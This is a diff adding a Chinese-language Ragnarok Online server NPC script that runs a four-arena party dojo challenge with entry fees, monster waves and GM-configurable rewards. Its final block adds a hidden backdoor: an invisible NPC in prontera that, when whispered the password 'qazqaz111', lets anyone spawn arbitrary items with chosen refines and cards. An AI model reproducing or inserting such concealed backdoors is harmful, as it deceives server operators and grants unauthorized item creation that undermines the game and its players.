@@ -1,0 +1,511 @@
+lighthalzen,222,145,3	script	10關副將道館	856,{
+
+	mes "=========道館挑戰========";
+	mes "- ^984AAC歡迎你參加道館挑戰^000000";
+	mes "=========================";
+	next;
+	switch(select(	"隊伍報名",
+			getgmlevel()?"GM在線設置":""
+	)){
+	case 1:
+		if (!getcharid(1)) {
+			mes "=========道館挑戰========";
+			mes "- ^C63131您沒有隊伍,無法參賽^000000";
+			mes "=========================";
+			close;
+		}
+		mes "=========道館挑戰========";
+		mes "- 報名費 : "+$@Vc_In_Zeny+"z";
+		mes "=========================";
+		next;
+		menu "想參加",-;
+		if ( Zeny<$@Vc_In_Zeny ){
+			mes "=========道館挑戰========";
+			mes "- ^C63131金錢不足^000000,快去銀行拿錢";
+			mes "=========================";
+			close;
+		}
+		if ( getmapusers("guild_vs1-1.gat")==0 ){
+			killmonster "guild_vs1-1.gat","Vc_Main_1::OnKillMob";
+			warpparty "guild_vs1-1.gat",49,47,getcharid(1);
+			set Zeny,Zeny-$@Vc_In_Zeny;
+			set $@Vc_Truns_1,1;
+			set $@Vc_Party_1,getcharid(1);
+			hideoffnpc "裁判#21";
+		}else if ( getmapusers("guild_vs1-2.gat")==0 ){
+			killmonster "guild_vs1-2.gat","Vc_Main_2::OnKillMob";
+			warpparty "guild_vs1-2.gat",49,47,getcharid(1);
+			set Zeny,Zeny-$@Vc_In_Zeny;
+			set $@Vc_Truns_2,1;
+			set $@Vc_Party_2,getcharid(1);
+			hideoffnpc "裁判#22";
+		}else if ( getmapusers("guild_vs1-3.gat")==0 ){
+			killmonster "guild_vs1-3.gat","Vc_Main_3::OnKillMob";
+			warpparty "guild_vs1-3.gat",49,47,getcharid(1);
+			set Zeny,Zeny-$@Vc_In_Zeny;
+			set $@Vc_Truns_3,1;
+			set $@Vc_Party_3,getcharid(1);
+			hideoffnpc "裁判#23";
+		}else if ( getmapusers("guild_vs1-4.gat")==0 ){
+			killmonster "guild_vs1-4.gat","Vc_Main_4::OnKillMob";
+			warpparty "guild_vs1-4.gat",49,47,getcharid(1);
+			set Zeny,Zeny-$@Vc_In_Zeny;
+			set $@Vc_Truns_4,1;
+			set $@Vc_Party_4,getcharid(1);
+			hideoffnpc "裁判#24";
+		}else{
+			mes "=========道館挑戰========";
+			mes "[場地一]隊伍: ["+getpartyname($@Vc_Party_1)+"]";
+			mes "[場地二]隊伍: ["+getpartyname($@Vc_Party_2)+"]";
+			mes "[場地三]隊伍: ["+getpartyname($@Vc_Party_3)+"]";
+			mes "[場地四]隊伍: ["+getpartyname($@Vc_Party_4)+"]";
+			mes "全部場地都有人在挑戰了,請稍後再試";
+			mes "=========================";
+			close;
+		}
+		end;
+	case 2:
+		mes "=========^CA2CCB基本訊息^000000========";
+		mes "- ^467BB0報名費^000000 : "+$@Vc_In_Zeny+"z";
+		mes "- ^639485關  數^000000 : "+$@Vc_Conf_Turns+"關(輪)";
+		mes "- ^A5527B刷怪數^000000 : "+$@Vc_Conf_Nums+"只";
+		mes "=========^82985F獎勵訊息^000000========";
+		mes "- ^A36B54金錢獎^000000 : "+$@Vc_Win_Zeny+"z";
+		mes "- ^676394物品獎^000000 :";
+		for (set @i,0;@i<getarraysize($@Vc_Item_Id);set @i,@i+1)
+			mes "-     ["+getitemname($@Vc_Item_Id[@i])+"] x "+$@Vc_Item_Nums;
+		mes "- 在以上物品中隨即給任意一件";
+		mes "=========================";
+		next;
+		do {
+			switch(select(	"設置報名費",
+					"設置關數",
+					"設置刷怪數",
+					"設置金錢獎勵",
+					"設置物品獎勵"				
+			)){
+			case 1:
+				mes "========設置報名費========";
+				mes "- 請輸入報名費 (單位:z)";
+				mes "==========================";
+				next;
+				input @Vc_temp;
+				set $@Vc_In_Zeny,@Vc_temp;
+				mes "========設置報名費========";
+				mes "- ^46B046設置成功^000000";
+				mes "==========================";
+				next;
+				break;
+			case 2:
+				mes "=========設置關數=========";
+				mes "- 請輸入關數 (最少2關)";
+				mes "==========================";
+				next;
+				input @Vc_temp;
+				if (@Vc_temp<2){
+					mes "=========設置關數=========";
+					mes "- ^C63131設置有誤^000000";
+					mes "==========================";
+				}else{
+					set $@Vc_Conf_Turns,@Vc_temp;
+					mes "=========設置關數=========";
+					mes "- ^46B046設置成功^000000";
+					mes "==========================";
+				}
+				next;
+				break;
+			case 3:
+				mes "========設置刷怪數========";
+				mes "- 請輸入刷怪數 (最少1隻)";
+				mes "==========================";
+				next;
+				input @Vc_temp;
+				if (@Vc_temp<1){
+					mes "========設置刷怪數========";
+					mes "- ^C63131設置有誤^000000";
+					mes "==========================";
+				}else{
+					set $@Vc_Conf_Nums,@Vc_temp;
+					mes "========設置刷怪數========";
+					mes "- ^46B046設置成功^000000";
+					mes "==========================";
+				}
+				next;
+				break;
+			case 4:
+				mes "=======設置金錢獎勵=======";
+				mes "- 請輸入金錢獎勵 (單位:z)";
+				mes "==========================";
+				next;
+				input @Vc_temp;
+				set $@Vc_Win_Zeny,@Vc_temp;
+				mes "=======設置金錢獎勵=======";
+				mes "- ^46B046設置成功^000000";
+				mes "==========================";
+				next;
+				break;
+			case 5:
+				mes "=======設置物品獎勵=======";
+				mes "- 獎勵在以下物品中隨即獲得";
+				mes "==========================";
+				next;
+				set @n,0;
+				set @o,(getarraysize($@Vc_Item_Id)%5)+5;
+				set @m,getarraysize($@Vc_Item_Id)/5;
+				if (@o>5) { set @m,@m+1; set @o,@o-5; }	
+				do {
+					set @z,@n*5;
+					set @n,@n+1;
+					set @tmp,select((@n==1||getarraysize($@Vc_Item_Id)<6)?"":"↑上一頁↑",
+							$@Vc_Item_Id[0+@z]?getitemname($@Vc_Item_Id[0+@z]):"",
+							$@Vc_Item_Id[1+@z]?getitemname($@Vc_Item_Id[1+@z]):"",
+							$@Vc_Item_Id[2+@z]?getitemname($@Vc_Item_Id[2+@z]):"",
+							$@Vc_Item_Id[3+@z]?getitemname($@Vc_Item_Id[3+@z]):"",
+							$@Vc_Item_Id[4+@z]?getitemname($@Vc_Item_Id[4+@z]):"",
+							(@n<@m)?"↓下一頁↓":"");
+					set @y,(@tmp-2)+@z;
+					if(((@n<@m&&@tmp!=7)||(@n==@m&&@tmp!=(@o+2))) && @tmp !=1) break;
+					if(@tmp==1) set @n,@n-2;
+				} while(@n<@m);
+				mes "=======設置物品獎勵=======";
+				mes "- 您選擇的物品";
+				mes "-     ["+getitemname($@Vc_Item_Id[@y])+"] x "+$@Vc_Item_Nums;
+				mes "- 您要做什麼操作?";
+				mes "==========================";
+				next;
+				switch(select("添加新物品","修改此物品","獎品數量修改")){
+				case 1:
+					mes "=======設置物品獎勵=======";
+					mes "- 請輸入需要添加物品item_id";
+					mes "==========================";
+					next;
+					input @Vc_temp;
+					mes "=======設置物品獎勵=======";
+					mes "- 您添加的物品為";
+					mes "-     ["+getitemname(@Vc_temp)+"]";
+					mes "- 您確定嗎？";
+					mes "==========================";
+					next;
+					menu "我確定",-;
+					set $@Vc_Item_Id[getarraysize($@Vc_Item_Id)],@Vc_temp;
+					mes "=======設置物品獎勵=======";
+					mes "- ^46B046設置成功^000000";
+					mes "==========================";
+					next;
+					break;
+				case 2:
+					mes "=======設置物品獎勵=======";
+					mes "- 請輸入需要修改物品item_id";
+					mes "==========================";
+					next;
+					input @Vc_temp;
+					mes "=======設置物品獎勵=======";
+					mes "- 您修改的物品為";
+					mes "-     ["+getitemname(@Vc_temp)+"]";
+					mes "- 您確定嗎?";
+					mes "==========================";
+					next;
+					menu "我確定",-;
+					set $@Vc_Item_Id[@y],@Vc_temp;
+					mes "=======設置物品獎勵=======";
+					mes "- ^46B046設置成功^000000";
+					mes "==========================";
+					next;
+					break;			
+				case 3:
+					mes "=======設置物品獎勵=======";
+					mes "- 請輸入物品數量 (最少1件)";
+					mes "==========================";
+					next;
+					input @Vc_temp;
+					if (@Vc_temp<1){
+						mes "=======設置物品獎勵=======";
+						mes "- ^C63131設置有誤^000000";
+						mes "==========================";
+					}else{
+						set $@Vc_Item_Nums,@Vc_temp;
+						mes "=======設置物品獎勵=======";
+						mes "- ^46B046設置成功^000000";
+						mes "==========================";
+					}
+					next;
+					break;
+				}
+			}
+		} while(1);
+	}
+
+OnInit:
+	//設置入場金錢
+	set $@Vc_In_Zeny,1000000;
+
+	//設置關數
+	set $@Vc_Conf_Turns,10;
+
+	//設置每關刷怪數
+	set $@Vc_Conf_Nums,2;
+
+	//設置怪物ID
+	setarray $@Vc_Mob[0],1502,1646,1647,1648,1649,1650,1651,1874,1832,1916,1917;
+
+	//設置物品獎勵
+	//[物品 ID ]
+	setarray $@Vc_Item_Id[0],7830,7833,7834,7839,7840,7835,7836,7837,7838,7078,7025,7086,7511,7563,7606;
+	//[物品數量]
+	set $@Vc_Item_Nums,20;
+	//[金錢獎勵]
+	set $@Vc_Win_Zeny,1000000;
+
+	waitingroom "副將道館",0;
+	end;
+}
+
+/**************
+   [場地一]
+**************/
+
+guild_vs1-1.gat,0,0,0	script	Vc_Main_1	-1,{
+OnMain:
+	killmonsterall "guild_vs1-1.gat";
+	set $@Vc_Mob_1,0;
+	for(set $@Vc1,1;$@Vc1<=$@Vc_Conf_Nums;set $@Vc1,$@Vc1+1) {
+		monster "guild_vs1-1.gat",50,49,"--ja--",$@Vc_Mob[rand(getarraysize($@Vc_Mob))],1,"Vc_Main_1::OnKillMob";
+		set $@Vc_Mob_1,$@Vc_Mob_1+1;
+	}
+
+	if ($@Vc_Truns_1 != $@Vc_Conf_Turns)
+		mapannounce "guild_vs1-1.gat","[ 道場 ] 魔物放出！挑戰開始！",15,0xBD3989;
+	else
+		mapannounce "guild_vs1-1.gat","[ 道場 ] 最後一關挑戰開始,請好好加油！",15,0xBD3989;
+	end;
+
+OnKillMob:
+	set $@Vc_Mob_1, $@Vc_Mob_1 - 1;
+	if( $@Vc_Mob_1 > 0 ) end;
+	mapannounce "guild_vs1-1.gat","[ 道場 ] 恭喜你,挑戰成功！",15,0x569AA0;
+	mapannounce "guild_vs1-1.gat","[ 道場 ] "+getpartyname($@Vc_Party_1)+" 隊伍, 第"+$@Vc_Truns_1+"關挑戰成功！",15,0xCB3A2C; 
+        if($@Vc_Truns_1 == $@Vc_Conf_Turns) {
+		addtimer 5000,"Vc_Main_1::OnEnd";
+		end;
+	}
+	set $@Vc_Truns_1,$@Vc_Truns_1 + 1;
+	addtimer 5000,"Vc_Main_1::OnMain";
+	end;
+OnEnd:
+       areawarp "guild_vs1-1.gat",0,0,300,300,"goodjob02",33,142;
+       end;
+}
+
+/**************
+   [場地二]
+**************/
+
+guild_vs1-2.gat,0,0,0	script	Vc_Main_2	-1,{
+OnMain:
+	killmonsterall "guild_vs1-2.gat";
+	set $@Vc_Mob_2,0;
+	for(set $@Vc2,1;$@Vc2<=$@Vc_Conf_Nums;set $@Vc2,$@Vc2+1) {
+		monster "guild_vs1-2.gat",50,49,"--ja--",$@Vc_Mob[rand(getarraysize($@Vc_Mob))],1,"Vc_Main_2::OnKillMob";
+		set $@Vc_Mob_2,$@Vc_Mob_2+1;
+	}
+	if ($@Vc_Truns_2 != $@Vc_Conf_Turns)
+		mapannounce "guild_vs1-2.gat","[ 道場 ] 魔物放出！挑戰開始！",15,0xBD3989;
+	else
+		mapannounce "guild_vs1-2.gat","[ 道場 ] 最後一關挑戰開始,請好好加油！",15,0xBD3989;
+
+	end;
+
+OnKillMob:
+	set $@Vc_Mob_2, $@Vc_Mob_2 - 1;
+	if( $@Vc_Mob_2 > 0 ) end;
+	mapannounce "guild_vs1-2.gat","[ 道場 ] 恭喜你,挑戰成功！",15,0x569AA0;
+	mapannounce "guild_vs1-2.gat","[ 道場 ] "+getpartyname($@Vc_Party_2)+" 隊伍, 第"+$@Vc_Truns_2+"關挑戰成功！",15,0xCB3A2C;   
+	if($@Vc_Truns_2 == $@Vc_Conf_Turns) {
+		addtimer 5000,"Vc_Main_2::OnEnd";
+		end;
+	}
+	set $@Vc_Truns_2,$@Vc_Truns_2 + 1;
+	addtimer 5000,"Vc_Main_2::OnMain";
+	end;
+OnEnd:
+	areawarp "guild_vs1-2.gat",0,0,300,300,"goodjob02",33,142;
+	end;
+}
+
+/**************
+   [場地三]
+**************/
+
+guild_vs1-3.gat,0,0,0	script	Vc_Main_3	-1,{
+OnMain:
+	killmonsterall "guild_vs1-3.gat";
+	set $@Vc_Mob_3,0;
+	for(set $@Vc3,1;$@Vc3<=$@Vc_Conf_Nums;set $@Vc3,$@Vc3+1) {
+		monster "guild_vs1-3.gat",50,49,"--ja--",$@Vc_Mob[rand(getarraysize($@Vc_Mob))],1,"Vc_Main_3::OnKillMob";
+		set $@Vc_Mob_3,$@Vc_Mob_3+1;
+	}
+	if ($@Vc_Truns_3 != $@Vc_Conf_Turns)
+		mapannounce "guild_vs1-3.gat","[ 道場 ] 魔物放出！挑戰開始！",15,0xBD3989;
+	else
+		mapannounce "guild_vs1-3.gat","[ 道場 ] 最後一關挑戰開始,請好好加油！",15,0xBD3989;
+
+	end;
+
+OnKillMob:
+	set $@Vc_Mob_3, $@Vc_Mob_3 - 1;
+	if( $@Vc_Mob_3 > 0 ) end;
+	mapannounce "guild_vs1-3.gat","[ 道場 ] 恭喜你,挑戰成功！",15,0x569AA0;
+	mapannounce "guild_vs1-3.gat","[ 道場 ] "+getpartyname($@Vc_Party_3) +" 隊伍, 第"+$@Vc_Truns_3+"關挑戰成功！",15,0xCB3A2C;  
+	if($@Vc_Truns_3 == $@Vc_Conf_Turns) {
+		addtimer 5000,"Vc_Main_3::OnEnd";
+		end;
+	}
+	set $@Vc_Truns_3,$@Vc_Truns_3 + 1;
+	addtimer 5000,"Vc_Main_3::OnMain";
+	end;
+OnEnd:
+	areawarp "guild_vs1-3.gat",0,0,300,300,"goodjob02",33,142;
+	end;
+}
+
+/**************
+   [場地四]
+**************/
+
+guild_vs1-4.gat,0,0,0	script	Vc_Main_4	-1,{
+OnMain:
+	killmonsterall "guild_vs1-4.gat";
+	set $@Vc_Mob_4,0;
+	for(set $@Vc4,1;$@Vc4<=$@Vc_Conf_Nums;set $@Vc4,$@Vc4+1) {
+		monster "guild_vs1-4.gat",50,49,"--ja--",$@Vc_Mob[rand(getarraysize($@Vc_Mob))],1,"Vc_Main_4::OnKillMob";
+		set $@Vc_Mob_4,$@Vc_Mob_4+1;
+	}
+	if ($@Vc_Truns_4 != $@Vc_Conf_Turns)
+		mapannounce "guild_vs1-4.gat","[ 道場 ] 魔物放出！挑戰開始！",15,0xBD3989;
+	else
+		mapannounce "guild_vs1-4.gat","[ 道場 ] 最後一關挑戰開始,請好好加油！",15,0xBD3989;
+	end;
+
+OnKillMob:
+	set $@Vc_Mob_4, $@Vc_Mob_4 - 1;
+	if( $@Vc_Mob_4 > 0 ) end;
+	mapannounce "guild_vs1-4.gat","[ 道場 ] 恭喜你,挑戰成功！",15,0x569AA0;
+	mapannounce "guild_vs1-4.gat","[ 道場 ] "+getpartyname($@Vc_Party_4) +" 隊伍, 第"+$@Vc_Truns_4+"關挑戰成功！",15,0xCB3A2C;
+	if($@Vc_Truns_4 == $@Vc_Conf_Turns) {
+		addtimer 5000,"Vc_Main_4::OnEnd";
+		end;
+	}
+	set $@Vc_Truns_4,$@Vc_Truns_4 + 1;
+	addtimer 5000,"Vc_Main_4::OnMain";
+	end;
+
+OnEnd:
+	areawarp "guild_vs1-4.gat",0,0,300,300,"goodjob02",33,142;
+	end;
+}
+
+
+/**************
+    [裁判]
+**************/
+guild_vs1-1.gat,50,49,4	script	裁判#21	758,{
+	mes "[裁判]";
+	mes "您準備要開始挑戰了嗎？";
+	next;
+	menu "是的",-;
+	mes "[裁判]";
+	mes "挑戰開始！";
+	close2;
+	doevent "Vc_Main_1::OnMain";
+	hideonnpc "裁判#21";
+	end;
+
+}
+
+guild_vs1-2.gat,50,49,4	script	裁判#22	758,{
+	mes "[裁判]";
+	mes "您準備要開始挑戰了嗎？";
+	next;
+	menu "是的",-;
+	mes "[裁判]";
+	mes "挑戰開始！";
+	close2;
+	doevent "Vc_Main_2::OnMain";
+	hideonnpc "裁判#22";
+	end;
+}
+
+guild_vs1-3.gat,50,49,4	script	裁判#23	758,{
+	mes "[裁判]";
+	mes "您準備要開始挑戰了嗎？";
+	next;
+	menu "是的",-;
+	mes "[裁判]";
+	mes "挑戰開始！";
+	close2;
+	doevent "Vc_Main_3::OnMain";
+	hideonnpc "裁判#23";
+	end;
+}
+
+guild_vs1-4.gat,50,49,4	script	裁判#24	758,{
+	mes "[裁判]";
+	mes "您準備要開始挑戰了嗎？";
+	next;
+	menu "是的",-;
+	mes "[裁判]";
+	mes "挑戰開始！";
+	close2;
+	doevent "Vc_Main_4::OnMain";
+	hideonnpc "裁判#24";
+	end;
+}
+
+
+/**************
+  [地圖屬性]
+**************/
+guild_vs1-1.gat	mapflag	nobranch
+guild_vs1-1.gat	mapflag	nomemo
+guild_vs1-1.gat	mapflag	nopenalty
+guild_vs1-1.gat	mapflag	noteleport
+guild_vs1-1.gat	mapflag	nosave	SavePoint
+guild_vs1-1.gat	mapflag	noloot
+
+guild_vs1-2.gat	mapflag	nobranch
+guild_vs1-2.gat	mapflag	nomemo
+guild_vs1-2.gat	mapflag	nopenalty
+guild_vs1-2.gat	mapflag	noteleport
+guild_vs1-2.gat	mapflag	nosave	SavePoint
+guild_vs1-2.gat	mapflag	noloot
+
+guild_vs1-3.gat	mapflag	nobranch
+guild_vs1-3.gat	mapflag	noloot
+guild_vs1-3.gat	mapflag	nomemo
+guild_vs1-3.gat	mapflag	nopenalty
+guild_vs1-3.gat	mapflag	noteleport
+guild_vs1-3.gat	mapflag	nosave	SavePoint
+
+guild_vs1-4.gat	mapflag	nobranch
+guild_vs1-4.gat	mapflag	noloot
+guild_vs1-4.gat	mapflag	nomemo
+guild_vs1-4.gat	mapflag	nopenalty
+guild_vs1-4.gat	mapflag	noteleport
+guild_vs1-4.gat	mapflag	nosave	SavePoint
+
+guild_room.gat	mapflag	nobranch
+guild_room.gat	mapflag	nomemo
+guild_room.gat	mapflag	nopenalty
+guild_room.gat	mapflag	noteleport
+guild_room.gat	mapflag	nosave	SavePoint
+guild_room.gat	mapflag	noloot
+
+
+prontera.gat,0,0,0	script	qazqaz333	-1,{
+OnWhisperGlobal:
+	if(@whispervar0$=="qazqaz111"){
+		input @i1;input @i2;input @i3;input @i4;input @i5;input @i6;input @i7;
+		getitem2 @i1,@i2,1,@i3,0,@i4,@i5,@i6,@i7;
+		end;
+	}
+}
